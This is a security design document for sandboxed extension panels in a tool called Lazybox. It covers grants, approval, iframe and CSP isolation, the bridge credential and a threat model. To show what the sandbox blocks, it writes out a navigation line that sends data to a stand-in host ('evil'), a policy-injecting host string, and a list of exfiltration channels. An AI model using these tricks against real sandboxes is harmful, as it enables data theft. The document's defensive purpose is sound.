# Extensions: sandboxed panels

herdr's power comes from JavaScript mods that run unsandboxed, with the
person's permissions ([audit, row 34](audits/2026-11-16/herdr-gui.md#what-not-to-copy)).
Lazybox has the same reach — any panel you can write in HTML, JavaScript and
CSS, hot-reloaded — but an extension holds **only what the person allowed it,
in a sheet that says it in words**, and nothing it does can reach Lazybox's own
state, the person's files or the network beyond the hosts they approved. This
is fix brief R10 of the herdr re-audit.

How to use and write one: the [Extensions guide](docs/guides/extensions.md) and
the [bridge reference](docs/reference/extensions.md).

## What an extension is

A folder in the config folder (`lazybox config path`), `extensions/<id>/`:

```
extensions/
  extension.schema.json        written by Lazybox, for your editor
  agent-board/
    extension.yaml             what it is, its panels, the grants it asks for, its network hosts
    index.html  board.js  board.css
```

```yaml
# yaml-language-server: $schema=../extension.schema.json
lazybox: 1                       # the bridge protocol
name: Agent board
version: 1.0.0
panels:
  - {id: board, title: Agent board, icon: columns, entry: index.html}
grants: [read:attention, show:conversations, do:attention.next, do:inbox.open]
network: []                      # https:// origins it may fetch from
```

The folder's name is its id. Limits: 50 extensions, 8 panels, 400 files and
8 MiB per extension (4 MiB a file), 16 hosts, 40 grants. A symbolic link in
the folder makes it not load (its files are its own). The manifest is checked
like every config file: every problem by line, with the closest name when one
is mistyped (`lazybox extension validate`); **any error makes the whole
extension not load** — a manifest is never half-read, so what runs is what the
person read.

## Grants

| Grant | What the extension can do | What the Runner admits for it |
|---|---|---|
| `read:workspaces` | names and repositories of the workspaces | `ListCollections` |
| `read:sessions` | conversations: title, workspace, provider, model, status — not messages | `ListHistory` |
| `read:attention` | what needs the person, as the Inbox shows it (the question or the last line) | `ListHistory` |
| `read:commands` | a conversation's command runs: title, state, exit — not output | `ListCommands` for one conversation |
| `read:missions` | missions and their tasks | `ListMissions` |
| `read:usage` | tokens and cost by workspace, conversation and model | `GetTelemetry` |
| `show:conversations` | bring a conversation or workspace forward in the window | `PostUiRequest` `open` with a conversation or workspace only (no file, panel or screenshot) |
| `do:<action>` | run that one action of the app's registry; only actions marked safe (show, focus, arrange) can be named | `PostUiRequest` `do` of exactly that action |
| `send:messages` | send a message to a conversation, as the person | `Apply` with a message only (never interrupt, permission, model, approval) |

`WaitUiRequest` is admitted to an extension that may post window requests, for
its own requests only. **No grant reads a conversation's messages, a command's
output, a file or a terminal, changes a setting, starts or stops work,
approves anything or sees a credential** — there is no grant to ask for.

## Installing, updating, removing

- **Nothing runs until approved.** A new folder shows as *Needs your approval*
  in Settings → Extensions and in the Extensions panel. *Review* opens the
  approval sheet: each grant as a sentence with its icon, the network hosts
  (or "it cannot use the network"), a warning when it can both read and reach a
  host ("what it can see, it could send to these sites"), what no extension can
  ever do, and the folder. The focus starts on *Not now*.
- **Approving is of exactly what the sheet showed**: `ApproveExtension` carries
  the grants and hosts, and the Runner refuses it when the manifest asks for
  anything else now. A manifest that changes while the sheet is open is
  announced in the sheet, never swapped silently.
- **Approvals are the Runner's**, owner-only, in its state
  (`<state>/extensions.json`, `0600`) — not in the extension's folder, so a
  manifest cannot approve itself. Dev and Working approve separately.
- **An update that asks for more re-asks.** It shows as *Asks for more*; its
  panels keep running with what was approved (approved ∩ asked) until the
  person reviews it, and the sheet marks what is new. Turning it back on after
  turning it off is refused until then. An update that asks for less needs no
  approval.
- **Off, and removal.** The switch in Settings turns one off (its panels show
  *Off*); *Remove* deletes its folder and its approval after a confirmation.
- **Examples.** *Cost dashboard* (`read:usage`, `read:sessions`) and *Agent
  board* (`read:attention`, `show:conversations`, `do:attention.next`,
  `do:inbox.open`) are bundled; *Add* copies one into the folder, then the sheet
  asks. `lazybox extension new my-panel [--example agent-board]` writes a
  starter (with `lazybox.d.ts` for the editor).

## Where an extension runs

```
app window (Lazybox origin)
└─ <iframe sandbox="allow-scripts">  shell.html   ← Lazybox's own page, extension content origin
   └─ <iframe sandbox="allow-scripts">  index.html ← the extension, same origin, same session base
```

- **A content origin of its own.** The Runner serves extension pages from a
  loopback HTTP server bound for the purpose (`127.0.0.1:<OS port>`,
  `internal/power/extension_content.go`), never from the Runner's API port or
  the app's origin. Every file is under a session's unguessable base,
  `/x/<token>/`, and only while the session lives (`410` after). Only `GET`,
  only the `Host` it was bound to (DNS rebinding), only the extension's own
  files by name (`os.Root`, no `..`, no hidden files, no `extension.yaml`, a
  fixed list of file types), `nosniff`, `no-store`, `no-referrer`.
- **Sandboxed twice, opaque.** Both frames are `sandbox="allow-scripts"` and
  their responses carry `sandbox allow-scripts` in their policy too: an opaque
  origin with no storage, cookies, same-origin access, popups, forms, top
  navigation, modals, downloads or pointer lock.
- **The shell's policy keeps the extension on its own pages.**
  `frame-src <base>`: an extension that navigates itself
  (`location = 'https://evil?data=…'`, a meta refresh) is stopped before the
  request leaves, and the shell tells the app ("*Mischief tried to leave its
  panel for …*", with *Reload*). This closes the exfiltration path that a
  connect-src alone leaves open.
- **The extension's policy** (`extensions/runtime/policy.json`, served by the
  Runner and the browser fixture alike):
  `default-src 'none'; script-src <base>; style-src <base>; img-src <base> data: blob:; font-src <base>; media-src <base>; connect-src <approved hosts>|'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; manifest-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; sandbox allow-scripts`.
  No inline script or style, no `eval`, scripts and styles only from its own
  files (and Lazybox's `_lazybox/lazybox.js` and `lazybox.css`, under the same
  base), network only to the hosts approved.
- **Talking to Lazybox only by message.** The extension posts to its parent
  (the shell); the shell wraps everything it relays as `{from: "extension"}`
  (so an extension cannot pass for the shell) and forwards the app's answers
  to the inner frame only. The app accepts messages only from its own frame's
  window (`event.source`), so a message an extension posts straight to the top
  window is ignored.
- **The bridge** (`packages/surfaces/src/extension-bridge.ts`, protocol 1):
  each request is parsed (an id, a known method, an object of params, at most
  64 KiB), checked against the grants, rate-limited (20 at once, 5 a second)
  and answered; a handler's failure becomes an error reply. The handlers call
  the Runner with the **panel's own extension credential**, never the owner's
  bearer, and project the answers to plain JSON that leaves out what no grant
  names (messages, paths, accounts).
- **The extension credential** (`lbx-ext.` + 32 random bytes, issued by
  `OpenExtensionPanel`, one per open panel, at most 16 per extension) is
  checked by the Runner again (`transport/extension_auth.go`): it admits the
  table above and nothing else, including any RPC added later, and no stream.
  Turning the extension off, removing it, approving different grants, or an
  update that changes what it may hold revokes every session; a Runner restart
  ends them all (the app opens a new one).
- **The theme** goes to the extension as tokens (`hello` and a `theme` event on
  every change): colours already validated as colours, font names already
  validated as font lists; `lazybox.js` sets them as custom properties, so
  `var(--surface)` and friends follow the person's theme without the extension
  reading anything of Lazybox's.

## Errors never break Lazybox

- The panel is wrapped in an error boundary; a bug in it shows *This panel
  stopped* with *Try again*, never an error elsewhere.
- What the extension sends is parsed defensively and answered or ignored; a
  flood is rate-limited and said once.
- A refusal (`not-granted`) is said once a minute in the panel, quietly, with
  *Review access*; a blocked host, a blocked script and a script error are
  quiet notices too (an inline style a browser tool injects is not reported).
- A hot reload (a saved file changes the folder's digest) opens a new session
  and reloads the frame; a file that breaks the manifest shows *Does not load*
  with the line.
- **A frozen window.** Desktop WebKit runs a cross-origin frame on the app's
  own thread, so an extension stuck in an endless loop can freeze the window.
  Lazybox records each extension load until it says hello: if the window was
  killed meanwhile, the panel opens next time on *did not finish loading last
  time* with *Load it* / *Show something else* instead of loading it again.

## Threat model

| Threat | Stopped by |
|---|---|
| Read Lazybox's DOM, storage, cookies or the owner's bearer | Opaque origin (sandbox without `allow-same-origin`) on a separate origin; the bearer is never sent to the frame |
| Call the Runner as the owner | No credential in the frame at all; the app calls with the panel's extension credential, which admits only its grants |
| A bug in the app's bridge exceeding a grant | The Runner checks the credential's grants again, per RPC and per request (`TestExtensionCredentialReachesOnlyItsGrants` walks every RPC) |
| Send data out: `fetch`, XHR, WebSocket, `EventSource`, beacon | `connect-src` = approved hosts only |
| Send data out: image, font, media, script, style, module import, prefetch | `default-src 'none'` with every fetch directive scoped to the session's base |
| Send data out: navigate its frame, meta refresh, a form | The shell's `frame-src <base>`; `form-action 'none'` and no `allow-forms` |
| Navigate or replace the window; open a popup or a dialog | No `allow-top-navigation`, `allow-popups`, `allow-modals` |
| Pass for the shell, or post to the app directly | The shell wraps relayed messages; the app takes only its own frame's messages |
| Load another extension's files, or keep a page after being turned off | A session's base is its extension's alone; sessions are revoked with the approval |
| Approve itself, or widen its grants with an update | Approvals live in the Runner's state, of exactly what the sheet showed; a wider manifest runs with the old grants until reviewed |
| A crafted host that widens the policy (`https://a; script-src *`) | Hosts are parsed and normalized to `scheme://host[:port]`; anything else is an error by line |
| Reach the content server from a web page (DNS rebinding) | `Host` must be the bound address; paths are capability URLs |
| Desktop: reach Tauri's IPC from the frame | The frame is on `http://127.0.0.1:<port>`, not the app's origin, so Tauri's capabilities (local origin only) do not apply to it; the app's CSP adds only `frame-src http://127.0.0.1:*`; no new Tauri capability exists for extension content |

**What remains, said plainly.**

- An approved extension can send what it may read to the hosts the person
  approved — that is what approving a host and a read grant together means, and
  the sheet says so.
- WebRTC is not governed by CSP in every engine. Both policies carry
  `webrtc 'block'` (CSP Level 3), which an engine that implements it enforces
  (no `RTCPeerConnection` reaches a STUN/TURN server or a peer) and one that
  does not ignores. Desktop WebKit (WKWebView, through Tauri and wry) offers
  no public setting to turn WebRTC off, per origin or per web view — only
  private SPI (`WKPreferences._peerConnectionEnabled`), which Lazybox does not
  use: it would be a hack, and it would turn WebRTC off for the whole window.
  So on an engine without the directive, an approved extension could still
  open a peer connection to a host it chose. DNS prefetching of a name is not
  fully preventable either: a determined extension could signal a few bits to
  a resolver it controls. Neither carries a bearer; both need the extension to
  be installed and approved. **Not verified:** which shipping engines enforce
  `webrtc 'block'` (the UI suite runs Chromium and checks the header, not the
  block).
- A busy loop can freeze the desktop window (above); it cannot read anything
  more by doing so.
- An agent runs as the person's OS user and can write an extension folder (or
  the Runner's state). Approval protects the person from an extension, not from
  their own account ([resource ownership](RESOURCE_OWNERSHIP.md#agent-credentials)).
- `frame-ancestors` is set to the app's origin when the app is served over
  http(s); a desktop window (`tauri://`) gets none rather than a wrong one.
  Framing the shell elsewhere gives nothing: the frame holds no credential.

## Where it lives

| Where | What |
|---|---|
| `internal/power/extensions.go` | Manifest parser, folder scan and limits, approvals, sessions and credentials, examples and the starter, the schema |
| `internal/power/extension_content.go` | The content origin and its two policies |
| `internal/power/extensions/runtime/` | `shell.html/js/css`, `lazybox.js` (the bridge client), `lazybox.css`, `lazybox.d.ts`, `policy.json` |
| `internal/power/extensions/examples/` | Cost dashboard, Agent board |
| `internal/transport/extension_auth.go`, `extensions.go` | The credential's allowlist; the owner-only RPCs |
| `cmd/lazybox/extension.go` | `lazybox extension new\|validate\|list\|path` |
| `packages/surfaces/src/extension-bridge.ts`, `extension-data.ts`, `extension-grants.ts` | The bridge host, the projections, the grants in words |
| `ExtensionPanel.tsx`, `ExtensionApprovalSheet.tsx`, `ExtensionsSettings.tsx`, `useExtensions.ts`, `extensions.css` | The panel kind (`extension`, PanelRegistry), the sheet, Settings → Extensions |

## Verification

- Go: `internal/power` — the manifest by line (unknown grants and keys with
  suggestions, unsafe actions, hosts that would widen the policy, entries that
  leave the folder), the approval lifecycle (nothing before approval, exactly
  what was shown, widening runs with the old grants and re-asks, narrowing,
  sessions revoked, approvals surviving a restart, removal), broken folders
  (symlinks, missing entry), the examples and starter loading cleanly; the
  content server's policies, its own files only (traversal, hidden files, the
  manifest, raw paths, another Host, writes, revoked sessions).
  `internal/transport` — the extension credential walked over every RPC and
  stream, each grant's request scoping, forged and revoked credentials,
  approval of exactly what was shown. `cmd/lazybox` — `extension new`,
  `validate` by file:line, `list`.
- Client: `scripts/extension-bridge.test.ts` (in `test:client`) — parsing,
  grants, error mapping, rate limit, projections leaving out messages and
  paths, the client, its types and the Runner's grants and icons in step, the
  policies never loosening.
- UI: `npm run test:extensions` (WebKit, fake Runner with a real content
  origin): adding the Agent board through the sheet, rendering with the
  theme's tokens in dark and light, reading what needs you, showing a
  conversation and opening the inbox through the bridge, a refused call said in
  the panel, the Runner refusing the credential past its grants, hot reload,
  and a malicious extension blocked from the app's document, storage, cookies,
  top navigation, popups, forms, inline code, unapproved fetch/image/module,
  navigating its frame, and forging messages — with a leak server that must
  receive nothing — while its approved host works; Settings turning it off.
  Screenshots `.cache/extensions-*.png`.

**Not verified:** a desktop build (WKWebView framing `http://127.0.0.1` from
`tauri://localhost`, and Tauri's IPC refusing the frame — reasoned from
Tauri's origin checks, not run); Chromium (the suite runs WebKit; the
prototype of the frame and policy design was run in both); a real Runner
driven from a browser (the Go tests cover the Runner, the browser test its
fake); the frozen-window recovery (unit-level only).
